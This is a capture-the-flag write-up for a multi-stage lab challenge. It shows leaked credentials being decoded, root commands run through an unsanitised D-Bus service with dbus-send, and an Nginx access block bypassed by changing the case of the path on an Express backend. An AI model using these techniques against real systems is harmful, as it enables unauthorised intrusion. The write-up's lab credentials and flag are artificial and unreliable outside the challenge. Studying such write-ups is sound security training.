# It Takes Two — Writeup

| | |
|:---|:---|
| **Challenge Author** | Cynthia |
| **Writeup Author** | Yeung Wang Sang |
| **Category** | Penetration Testing / Boot2Root / Privilege Escalation |
| **Status** | ✅ Solved |

---

## Overview

A multi-stage Boot2Root challenge. Each layer peels back to reveal the next attack surface — from credential leakage, to privilege escalation via a misconfigured D-Bus service, to a subtle routing mismatch between Nginx and Express.js.

### Exploit Chain at a Glance

```
[webapp - player shell]
        |
        | 1. Decode leaked Base64 credentials
        v
[security container - monitor@security]
        |
        | 2. Exploit insecure D-Bus service (root RCE)
        v
[Read Nginx reverse proxy config]
        |
        | 3. Abuse Nginx/Express case-sensitivity mismatch
        v
[FLAG]
```

---

## Step 1 — Initial Recon & Credential Discovery

Starting with a low-privilege shell on `webapp` as user `player`, reconnaissance uncovers a Base64-encoded string:

```text
eyJob3N0Ijoic2VjdXJpdHkiLCJwb3J0IjoyMiwidXNlcm5hbWUiOiJtb25pdG9yIiwicGFzc3dvcmQiOiJNMG4xdDByX1MzY3VyM18yMDI2ISIsInB1cnBvc2UiOiJTU0ggYWNjZXNzIHRvIHNlY3VyaXR5IG1vbml0b3Jpbmcgc2VydmVyIGZvciBoZWFsdGggY2hlY2tzIn0=
```

Decoding reveals credentials for an internal monitoring server:

```json
{
  "host": "security",
  "port": 22,
  "username": "monitor",
  "password": "M0n1t0r_S3cur3_2026!",
  "purpose": "SSH access to security monitoring server for health checks"
}
```

> **Key insight:** The `/admin_portal` endpoint on `webapp` is protected by an IP whitelist — it only accepts requests originating from the `security` server. We must pivot there first.

---

## Step 2 — Lateral Movement

Using the decoded credentials, we SSH into the `security` container:

```bash
ssh monitor@security
# Password: M0n1t0r_S3cur3_2026!
```

---

## Step 3 — D-Bus Privilege Escalation

Running `ps aux` inside the `security` machine reveals a suspicious **root-owned** process:

```
root  15  0.0  0.1  28828 18856 ?  S  04:05  0:00 python3 /opt/diagnostics/diagnostics-service.py
```

Reading the source exposes a classic **LPE vulnerability**: the service registers a D-Bus method `RunDiagnostic` that passes user input directly to `subprocess.run(shell=True)` — with zero sanitization.

**Exploit:** Use `dbus-send` to execute arbitrary commands as `root`:

```bash
dbus-send --system --print-reply \
  --dest=com.security.diagnostics \
  /com/security/diagnostics \
  com.security.diagnostics.Interface.RunDiagnostic \
  string:"ls -la /root"
```

---

## Step 4 — Sandbox Enumeration & Nginx Config Dump

Reading `/root/.init` via D-Bus reveals a heavily locked-down environment:

| Removed / Blocked | Detail |
|:---|:---|
| `python3` binary | Deleted immediately after D-Bus service starts |
| Network tools | `curl`, `wget`, `nc`, `bash`, `apt-get` all removed |
| Raw sockets | Blocked by systemd sandbox (`OSError: [Errno 93]`) |

However, **Nginx is still running**. We dump its config:

```bash
dbus-send --system --print-reply \
  --dest=com.security.diagnostics \
  /com/security/diagnostics \
  com.security.diagnostics.Interface.RunDiagnostic \
  string:"grep -r . /etc/nginx/conf.d 2>/dev/null"
```

**Nginx config revealed:**

```nginx
# Block direct access to admin_portal through the proxy
location /admin_portal {
    return 403 "Access denied by security policy.\n";
}

# Proxy all other requests to the webapp backend
location / {
    proxy_pass http://vulnerable:8000;

    # Automatically inject the auth token for all proxied requests
    proxy_set_header X-Auth-Token "S3cur1ty_M0n1t0r_T0k3n_X9K2!";
}
```

> **Key insight:** The proxy *automatically injects* the required `X-Auth-Token` header for us — but it blocks `/admin_portal` with a 403. We need to reach the backend without triggering that block rule.

---

## Step 5 — Case-Sensitivity Bypass (Final Exploit)

A **routing mismatch** exists between the proxy and the backend:

| Component | Case Handling | Effect |
|:---|:---|:---|
| **Nginx** (proxy) | Case-sensitive | Only blocks the exact string `/admin_portal` |
| **Express.js** (backend) | Case-insensitive | Treats `/Admin_portal` identically to `/admin_portal` |

**The bypass:** Request `/Admin_portal` (capital `A`). Nginx doesn't match its block rule, falls through to `location /`, injects the `X-Auth-Token`, and proxies it to the Express backend — which matches it case-insensitively and returns the flag.

Since the `security` container has no usable HTTP tools, we exit back to `webapp` where `curl` is available:

```bash
player@webapp:~$ curl -s http://security/Admin_portal
```

**Full request flow:**

```
curl /Admin_portal (webapp)
    │
    ▼
Nginx on security container
    ├─ Check: location /admin_portal  →  /Admin_portal ≠ /admin_portal  →  NO MATCH
    └─ Fallthrough: location /
           │  inject: X-Auth-Token: S3cur1ty_M0n1t0r_T0k3n_X9K2!
           │  proxy_pass → webapp:8000
           ▼
    Express.js backend
           ├─ Route match: /Admin_portal == /admin_portal  ✓  (case-insensitive)
           ├─ Token valid  ✓
           └─ Source IP = security  ✓
                   │
                   ▼
                 FLAG
```

---

## Flag

```json
{"status":"authorized","data":"PUCTF26{1t_t4k3s_tw0_t0_t4ng0_kIfuepoLyWIbluXTACaz3CIwRGNb3C38}"}
```

```
PUCTF26{1t_t4k3s_tw0_t0_t4ng0_kIfuepoLyWIbluXTACaz3CIwRGNb3C38}
```
